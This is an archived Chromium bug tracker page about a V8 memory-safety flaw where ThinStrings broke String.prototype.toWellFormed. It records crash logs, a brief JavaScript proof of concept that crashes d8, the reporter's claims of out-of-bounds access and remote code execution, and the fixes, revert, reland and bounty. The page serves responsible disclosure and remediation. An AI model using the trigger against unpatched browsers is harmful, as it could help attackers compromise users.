# [Security] V8 Debug check failed: OFFSET_OF(Isolate, string_stream_current_security_token_) == strin

| Field | Value |
|-------|-------|
| **Issue ID** | [40063148](https://issues.chromium.org/issues/40063148) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>JavaScript |
| **Platforms** | Mac |
| **Reporter** | vi...@gmail.com |
| **Assignee** | sy...@chromium.org |
| **Created** | 2023-02-18 |
| **Bounty** | $7,000.00 |

## Description

**Steps to reproduce the problem:**  

1.run the poc with d8  

2.  

3.

**Problem Description:**  

crash log:

abort: CSA\_DCHECK failed: Word32Equal(Word32And(instance\_type, Int32Constant(kStringEncodingMask)), Int32Constant(kTwoByteStringTag)) [../../src/builtins/builtins-string-gen.cc:1619]

# 

# Fatal error in ../../src/execution/isolate.h, line 1097

# Debug check failed: OFFSET\_OF(Isolate, string\_stream\_current\_security\_token\_) == string\_stream\_current\_security\_token\_debug\_offset\_.

# 

# 

# 

#FailureMessage Object: 0x7fff800cb4c0  

==== C stack trace ===============================

```
/home//v8/out/x64.debug/libv8_libbase.so(v8::base::debug::StackTrace::StackTrace()+0x1e) [0x7fc17261b07e]  
/home//v8/out/x64.debug/libv8_libplatform.so(+0x4f6ad) [0x7fc17256f6ad]  
/home//v8/out/x64.debug/libv8_libbase.so(V8_Fatal(char const\*, int, char const\*, ...)+0x16f) [0x7fc1725ea0ff]  
/home//v8/out/x64.debug/libv8_libbase.so(+0x58b8c) [0x7fc1725e9b8c]  
/home//v8/out/x64.debug/libv8_libbase.so(V8_Dcheck(char const\*, int, char const\*)+0x27) [0x7fc1725ea1a7]  
/home//v8/out/x64.debug/libv8.so(v8::internal::Isolate::set_string_stream_current_security_token(v8::internal::Object)+0x5f) [0x7fc176a613ef]  
/home//v8/out/x64.debug/libv8.so(v8::internal::StringStream::ClearMentionedObjectCache(v8::internal::Isolate\*)+0x2a) [0x7fc176a5fbaa]  
/home//v8/out/x64.debug/libv8.so(v8::internal::Isolate::PrintStack(_IO_FILE\*, v8::internal::Isolate::PrintStackMode)+0x40) [0x7fc175d56920]  
/home//v8/out/x64.debug/libv8.so(+0x43a29ad) [0x7fc1769d19ad]  
/home//v8/out/x64.debug/libv8.so(v8::internal::Runtime_AbortCSADcheck(int, unsigned long\*, v8::internal::Isolate\*)+0x128) [0x7fc1769d15f8]  
[0x7fc0ff96ec7c]  

```

with release version:  

Received signal 11 SEGV\_ACCERR 01a90023e000

==== C stack trace ===============================

[0x55e61092bed3]  

[0x55e61092be21]  

[0x7f8324165420]  

[0x55e60fab5c10]  

[0x55e59ff560db]  

[end of stack trace]  

Segmentation fault (core dumped)

So this poc will lead to remote code execution

**Additional Comments:**

\*\*Chrome version: \*\* 109.0.0.0 \*\*Channel: \*\* Not sure

**OS:** Mac OS

## Attachments

- [4.js](attachments/4.js) (text/plain, 394 B)

## Timeline

### [Deleted User] (2023-02-18)

[Empty comment from Monorail migration]

### sr...@google.com (2023-02-21)

syg@ can you take a look? Seems to be an issue in toWellFormed

[Monorail components: Blink>JavaScript]

### sr...@google.com (2023-02-21)

[Empty comment from Monorail migration]

### sr...@google.com (2023-02-21)

[Empty comment from Monorail migration]

### [Deleted User] (2023-02-21)

[Empty comment from Monorail migration]

### vi...@gmail.com (2023-02-21)

bool String::IsWellFormedUnicode(Isolate* isolate, Handle<String> string) {
   // One-byte strings are definitively well formed and cannot have unpaired
   //surrogates.
   if (string->IsOneByteRepresentation()) return true;

   // TODO(v8:13557): The two-byte case can be optimized by extending the
   // InstanceType. See
   // https://docs.google.com/document/d/15f-1c_Ysw3lvjy_Gx0SmmD9qeO8UuXuAbWIpWCnTDO8/
   string = Flatten(isolate, string);
   DisallowGarbageCollection no_gc;
   String::FlatContent flat = string->GetFlatContent(no_gc);
   DCHECK(flat. IsFlat());
   const uint16_t* data = flat.ToUC16Vector().begin();
   return !unibrow::Utf16::HasUnpairedSurrogate(data, string->length());
}
It is also clearly indicated in the IsWellFormedUnicode function(https://source.chromium.org/chromium/chromium/src/+/main:v8/src/objects/string-inl.h;drc=8223c4c9dab9fb6f5afefec2d6279fb9e59f2770;l=967),

// One-byte strings are definitively well formed and cannot have unpaired
//surrogates.
The string type created by const longPaddingString = ("x").padEnd(0x30000) is CONS_ONE_BYTE_STRING_TYPE, and the type can be converted to THIN_STRING_TYPE through the longPaddingString.__lookupSetter__(longPaddingString); function.

But here THIN_STRING_TYPE type string call toWellFormed will trigger DCHECK

The final streamlined poc is as follows:

function formatUtf(str) {
     const toStringFun = "".toString;
     const longPaddingString = ("x").padEnd(0x30000);// 244093=0x3B97D
     % DebugPrint(longPaddingString);
     // 0x2ea400000d1d: [Map] in ReadOnlySpace
     // - type: CONS_ONE_BYTE_STRING_TYPE
     // - instance size: 20
     readline();
     longPaddingString.__lookupSetter__(longPaddingString);
     % DebugPrint(longPaddingString);
     // 0x2ea400000f25: [Map] in ReadOnlySpace
     // - type: THIN_STRING_TYPE
     // - instance size: 16
     // - stable_map
     readline();
     longPaddingString.toWellFormed();// -------------crash
}
JSON. stringify(this, formatUtf);
As shown in the following stack traceback:

$_0::operator()() const platform-posix.cc:685
v8::base::OS::Abort platform-posix.cc:685
v8::internal::__RT_impl_Runtime_AbortCSADcheck runtime-test.cc:1273
v8::internal::Runtime_AbortCSADcheck runtime-test.cc:1266
Trigger DCHECK code is

RUNTIME_FUNCTION(Runtime_AbortCSADcheck) {
   HandleScope scope(isolate);
   DCHECK_EQ(1, args. length());
   Handle<String> message = args. at<String>(0);
   base::OS::PrintError("abort: CSA_DCHECK failed: %s\n",
                        message->ToCString().get());
   isolate->PrintStack(stderr);
   base::OS::Abort();
   UNREACHABLE();
}
This vulnerability has enabled memory out-of-bounds reads and write.

### [Deleted User] (2023-02-21)

Setting milestone and target because of high severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2023-02-21)

This is a serious security regression. If you are not able to fix this quickly, please revert the change that introduced it.

If this doesn't affect a release branch, or has not been properly classified for severity, please update the Security_Impact or Security_Severity labels, and remove the ReleaseBlock label. To disable this altogether, apply ReleaseBlock-NA.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2023-02-21)

Setting Pri-1 to match security severity High. If this is incorrect, please reset the priority. Sheriffbot won't make this change again.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sy...@chromium.org (2023-02-21)

The bug is that thin strings, unlike other string types, don't actually track the 1-byteness of the actual string. Either thin strings should start tracking 1-byte or 2-byte of the target, or this method needs to unwrap thin strings. Unwrapping thin strings is the short-term right fix for this security bug in any case.

### sy...@chromium.org (2023-02-21)

Even though String.prototype.isWellFormed and String.prototype.toWellFormed are shipping in M111, this bug was introduced with https://chromium-review.googlesource.com/c/v8/v8/+/4256026, which is in M112. So the fix won't need merge to M111.

### sy...@chromium.org (2023-02-21)

[Empty comment from Monorail migration]

### gi...@appspot.gserviceaccount.com (2023-02-22)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8/+/9e340a3e400f6e1403a60d85ec38f983c36142b5

commit 9e340a3e400f6e1403a60d85ec38f983c36142b5
Author: Shu-yu Guo <syg@chromium.org>
Date: Tue Feb 21 23:14:04 2023

[string-iswellformed] Fix for ThinStrings

Bug: chromium:1417389, v8:13557
Change-Id: I2afb2c723adc91c2b27e6ee89af2da74c0620cc4
Fixed: chromium:1417389
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/4278741
Commit-Queue: Shu-yu Guo <syg@chromium.org>
Reviewed-by: Adam Klein <adamk@chromium.org>
Cr-Commit-Position: refs/heads/main@{#85974}

[modify] https://crrev.com/9e340a3e400f6e1403a60d85ec38f983c36142b5/src/objects/string.tq
[modify] https://crrev.com/9e340a3e400f6e1403a60d85ec38f983c36142b5/src/builtins/string-towellformed.tq
[modify] https://crrev.com/9e340a3e400f6e1403a60d85ec38f983c36142b5/src/builtins/string-iswellformed.tq


### sy...@chromium.org (2023-02-22)

Reopening, after chatting with pthier@ the original fix wasn't robust enough.

### gi...@appspot.gserviceaccount.com (2023-02-22)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8/+/92a1d1a5e2c5e6883e422a30759ea645bae7e416

commit 92a1d1a5e2c5e6883e422a30759ea645bae7e416
Author: Shu-yu Guo <syg@chromium.org>
Date: Wed Feb 22 17:14:17 2023

Revert "[string-iswellformed] Fix for ThinStrings"

This reverts commit 9e340a3e400f6e1403a60d85ec38f983c36142b5.

Reason for revert: Not robust enough. Will land a single fix to be amenable to merging.

Original change's description:
> [string-iswellformed] Fix for ThinStrings
>
> Bug: chromium:1417389, v8:13557
> Change-Id: I2afb2c723adc91c2b27e6ee89af2da74c0620cc4
> Fixed: chromium:1417389
> Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/4278741
> Commit-Queue: Shu-yu Guo <syg@chromium.org>
> Reviewed-by: Adam Klein <adamk@chromium.org>
> Cr-Commit-Position: refs/heads/main@{#85974}

Bug: chromium:1417389, v8:13557
Change-Id: I999ce5430ebb15a5021bb5f3ee2e8331cd195289
No-Presubmit: true
No-Tree-Checks: true
No-Try: true
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/4282677
Auto-Submit: Shu-yu Guo <syg@chromium.org>
Commit-Queue: Rubber Stamper <rubber-stamper@appspot.gserviceaccount.com>
Bot-Commit: Rubber Stamper <rubber-stamper@appspot.gserviceaccount.com>
Cr-Commit-Position: refs/heads/main@{#86007}

[modify] https://crrev.com/92a1d1a5e2c5e6883e422a30759ea645bae7e416/src/objects/string.tq
[modify] https://crrev.com/92a1d1a5e2c5e6883e422a30759ea645bae7e416/src/builtins/string-towellformed.tq
[modify] https://crrev.com/92a1d1a5e2c5e6883e422a30759ea645bae7e416/src/builtins/string-iswellformed.tq


### [Deleted User] (2023-02-22)

[Empty comment from Monorail migration]

### [Deleted User] (2023-02-22)

[Empty comment from Monorail migration]

### gi...@appspot.gserviceaccount.com (2023-02-23)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8/+/11b20b78e6a1a9e2325defd548b8f3c9c67960ed

commit 11b20b78e6a1a9e2325defd548b8f3c9c67960ed
Author: Shu-yu Guo <syg@chromium.org>
Date: Thu Feb 23 21:12:51 2023

Reland "[string-iswellformed] Fix for ThinStrings"

This is a reland of commit 9e340a3e400f6e1403a60d85ec38f983c36142b5

Changes since revert:
  - Make fix more robust after flattening.

Original change's description:
> [string-iswellformed] Fix for ThinStrings
>
> Bug: chromium:1417389, v8:13557
> Change-Id: I2afb2c723adc91c2b27e6ee89af2da74c0620cc4
> Fixed: chromium:1417389
> Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/4278741
> Commit-Queue: Shu-yu Guo <syg@chromium.org>
> Reviewed-by: Adam Klein <adamk@chromium.org>
> Cr-Commit-Position: refs/heads/main@{#85974}

Bug: chromium:1417389, v8:13557
Change-Id: Iccdda22011c9317a96778b5d7cc5ec137a33f9e8
Fixed: chromium:1417389
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/4283399
Commit-Queue: Shu-yu Guo <syg@chromium.org>
Reviewed-by: Patrick Thier <pthier@chromium.org>
Cr-Commit-Position: refs/heads/main@{#86049}

[modify] https://crrev.com/11b20b78e6a1a9e2325defd548b8f3c9c67960ed/src/objects/string.tq
[modify] https://crrev.com/11b20b78e6a1a9e2325defd548b8f3c9c67960ed/src/objects/string-inl.h
[modify] https://crrev.com/11b20b78e6a1a9e2325defd548b8f3c9c67960ed/src/builtins/string-towellformed.tq
[modify] https://crrev.com/11b20b78e6a1a9e2325defd548b8f3c9c67960ed/src/runtime/runtime-strings.cc
[modify] https://crrev.com/11b20b78e6a1a9e2325defd548b8f3c9c67960ed/src/builtins/string-iswellformed.tq


### [Deleted User] (2023-02-25)

This is sufficiently serious that it should be merged to dev. But I can't see a Chromium repo commit here, so you will need to investigate what - if anything - needs to be merged to M112. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.

Merge review required: a reverted commit was detected after the merge request.

Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

Sheriffbot has determined this fix is necessary on milestone(s): [112].

Please answer the following questions so that we can safely process this merge request:
1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been tested on Canary?
3. Has this fix been verified to not pose any stability regressions and does it pose potential stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.


For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2023-02-26)

This is sufficiently serious that it should be merged to dev. But I can't see a Chromium repo commit here, so you will need to investigate what - if anything - needs to be merged to M112. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.

Merge review required: a reverted commit was detected after the merge request.

Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

Sheriffbot has determined this fix is necessary on milestone(s): [112].

Please answer the following questions so that we can safely process this merge request:
1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been tested on Canary?
3. Has this fix been verified to not pose any stability regressions and does it pose potential stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.


For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### pg...@google.com (2023-02-27)

[Empty comment from Monorail migration]

### am...@chromium.org (2023-02-27)

please merge the reland CL (commit: 1b20b78e6a1a9e2325defd548b8f3c9c67960ed) to M112, branch 5615, at your earliest convenience 

### gi...@appspot.gserviceaccount.com (2023-02-27)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8/+/a81616a899e89db2021216bdd5215d2583a3c027

commit a81616a899e89db2021216bdd5215d2583a3c027
Author: Shu-yu Guo <syg@chromium.org>
Date: Thu Feb 23 21:12:51 2023

Merged: Reland "[string-iswellformed] Fix for ThinStrings"

This is a reland of commit 9e340a3e400f6e1403a60d85ec38f983c36142b5

Changes since revert:
  - Make fix more robust after flattening.

Original change's description:
> [string-iswellformed] Fix for ThinStrings
>
> Bug: chromium:1417389, v8:13557
> Change-Id: I2afb2c723adc91c2b27e6ee89af2da74c0620cc4
> Fixed: chromium:1417389
> Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/4278741
> Commit-Queue: Shu-yu Guo <syg@chromium.org>
> Reviewed-by: Adam Klein <adamk@chromium.org>
> Cr-Commit-Position: refs/heads/main@{#85974}

(cherry picked from commit 11b20b78e6a1a9e2325defd548b8f3c9c67960ed)

Bug: chromium:1417389, v8:13557
Change-Id: Iccdda22011c9317a96778b5d7cc5ec137a33f9e8
Fixed: chromium:1417389
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/4283399
Commit-Queue: Shu-yu Guo <syg@chromium.org>
Reviewed-by: Patrick Thier <pthier@chromium.org>
Cr-Original-Commit-Position: refs/heads/main@{#86049}
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/4296326
Bot-Commit: Rubber Stamper <rubber-stamper@appspot.gserviceaccount.com>
Cr-Commit-Position: refs/branch-heads/11.2@{#9}
Cr-Branched-From: 755511a138609ac5939449a8ac615c15603a4454-refs/heads/11.2.214@{#1}
Cr-Branched-From: e6b1ccefb0f0f1ff8d310578878130dc53d73749-refs/heads/main@{#86014}

[modify] https://crrev.com/a81616a899e89db2021216bdd5215d2583a3c027/src/objects/string.tq
[modify] https://crrev.com/a81616a899e89db2021216bdd5215d2583a3c027/src/objects/string-inl.h
[modify] https://crrev.com/a81616a899e89db2021216bdd5215d2583a3c027/src/builtins/string-towellformed.tq
[modify] https://crrev.com/a81616a899e89db2021216bdd5215d2583a3c027/src/runtime/runtime-strings.cc
[modify] https://crrev.com/a81616a899e89db2021216bdd5215d2583a3c027/src/builtins/string-iswellformed.tq


### gi...@appspot.gserviceaccount.com (2023-02-27)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/834d2766c3dffd1c81ffb27e9e4a5a17804f9598

commit 834d2766c3dffd1c81ffb27e9e4a5a17804f9598
Author: Chrome Release Autoroll <chromium-release-autoroll@skia-public.iam.gserviceaccount.com>
Date: Mon Feb 27 22:42:52 2023

Roll v8 11.2 from fd890ab6d970 to 56a783773001 (2 revisions)

https://chromium.googlesource.com/v8/v8.git/+log/fd890ab6d970..56a783773001

2023-02-27 v8-ci-autoroll-builder@chops-service-accounts.iam.gserviceaccount.com Version 11.2.214.3
2023-02-27 syg@chromium.org Merged: Reland "[string-iswellformed] Fix for ThinStrings"

If this roll has caused a breakage, revert this CL and stop the roller
using the controls here:
https://autoroll.skia.org/r/v8-chromium-release-0
Please CC liviurau@google.com,v8-waterfall-sheriff@grotations.appspotmail.com,vahl@google.com on the revert to ensure that a human
is aware of the problem.

To file a bug in v8 11.2: https://bugs.chromium.org/p/v8/issues/entry
To file a bug in Chromium m112: https://bugs.chromium.org/p/chromium/issues/entry

To report a problem with the AutoRoller itself, please file a bug:
https://bugs.chromium.org/p/skia/issues/entry?template=Autoroller+Bug

Documentation for the AutoRoller is here:
https://skia.googlesource.com/buildbot/+doc/main/autoroll/README.md

Bug: chromium:1417389
Tbr: v8-waterfall-sheriff@grotations.appspotmail.com
Change-Id: I79306dbc4ee6e3572114da2cc68a1cff870f4dfd
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/4295603
Commit-Queue: Chrome Release Autoroll <chromium-release-autoroll@skia-public.iam.gserviceaccount.com>
Bot-Commit: Chrome Release Autoroll <chromium-release-autoroll@skia-public.iam.gserviceaccount.com>
Cr-Commit-Position: refs/branch-heads/5615@{#37}
Cr-Branched-From: 9c6408ef696e83a9936b82bbead3d41c93c82ee4-refs/heads/main@{#1109224}

[modify] https://crrev.com/834d2766c3dffd1c81ffb27e9e4a5a17804f9598/DEPS


### am...@google.com (2023-03-02)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@chromium.org (2023-03-02)

Congratulations! The VRP Panel has decided to award you $7,000 for this report. Thank you for your efforts and reporting this issue to us -- great work! 

### am...@google.com (2023-03-03)

[Empty comment from Monorail migration]

### ve...@chromium.org (2023-03-10)

[Empty comment from Monorail migration]

### [Deleted User] (2023-05-31)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/1417389?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail mergedwith: crbug.com/chromium/1417467, crbug.com/chromium/1417483, crbug.com/chromium/1417951, crbug.com/chromium/1418670]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40063148)*
